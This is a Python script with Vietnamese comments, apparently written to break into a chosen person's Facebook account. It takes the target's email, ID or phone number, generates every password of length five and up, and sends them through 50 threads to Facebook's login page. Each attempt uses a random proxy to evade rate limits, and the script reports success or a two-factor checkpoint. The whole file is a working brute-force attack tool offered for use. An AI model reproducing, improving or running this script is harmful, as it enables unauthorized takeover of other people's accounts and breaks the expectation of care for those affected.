import itertools
import requests
import threading
import queue
import random

# Các ký tự để thử trong mật khẩu
characters = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890.?!@"

# Queue để chứa mật khẩu và kết quả
password_queue = queue.Queue()
result_queue = queue.Queue()

# URL của trang đăng nhập Facebook
login_url = "https://www.facebook.com/login.php"

# Header để mô phỏng trình duyệt thật
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
}

# Lấy danh sách proxy từ tệp proxy.txt
def get_proxies_from_file():
    try:
        with open('proxy.txt', 'r') as file:
            proxies = file.read().splitlines()
            return proxies
    except IOError as e:
        print(f"Error reading proxies file: {str(e)}")
        return []

# Hàm thực hiện đăng nhập
def login(target, password, proxies):
    proxy = random.choice(proxies)
    proxies_dict = {
        'http': f'http://{proxy}',
        'https': f'http://{proxy}',
    }
    data = {
        'email': target,
        'pass': password,
        'login': 'Log In'
    }
    
    try:
        response = requests.post(login_url, headers=headers, data=data, proxies=proxies_dict, allow_redirects=False)
        
        if 'c_user' in response.cookies:
            return 1  # Đăng nhập thành công
        elif "checkpoint" in response.headers.get('location', ''):
            return 2  # Tài khoản yêu cầu xác minh 2 lớp
        return 0  # Đăng nhập thất bại
    except requests.RequestException as e:
        print(f"Lỗi khi gửi yêu cầu: {str(e)}")
        return -1  # Lỗi trong quá trình gửi yêu cầu

# Hàm sinh mật khẩu
def password_generator():
    length = 5
    while True:
        for password in itertools.product(characters, repeat=length):
            password_queue.put(''.join(password))
        length += 1

# Hàm xử lý đa luồng
def worker(target, proxies):
    while True:
        password = password_queue.get()
        if password is None:
            break
        print(f"Trying password: {password}")
        result = login(target, password, proxies)
        if result == 1:
            result_queue.put(f"[+] Thành công! Mật khẩu: {password}")
            break
        elif result == 2:
            result_queue.put(f"[!] Tài khoản bị khóa với xác minh 2 yếu tố. Mật khẩu đã thử: {password}")
            break
        password_queue.task_done()

# Hàm chính để khởi chạy các luồng
def main(target):
    proxies = get_proxies_from_file()  # Lấy danh sách proxy từ tệp

    if not proxies:
        print("Không có proxy, thoát chương trình.")
        return

    num_threads = 50  # Số luồng để thử nghiệm

    # Tạo luồng thử mật khẩu
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(target, proxies,))
        t.daemon = True
        t.start()
        threads.append(t)

    # Tạo luồng sinh mật khẩu
    pw_gen_thread = threading.Thread(target=password_generator)
    pw_gen_thread.daemon = True
    pw_gen_thread.start()

    # Đợi cho tới khi tìm được mật khẩu hoặc có kết quả
    while result_queue.empty():
        threading.Event().wait(1)

    # Hiển thị kết quả
    while not result_queue.empty():
        result = result_queue.get()
        print(result)

    # Dừng các luồng
    for _ in range(num_threads):
        password_queue.put(None)

if __name__ == "__main__":
    target = input("Nhập email, ID, hoặc số điện thoại của mục tiêu: ")
    main(target)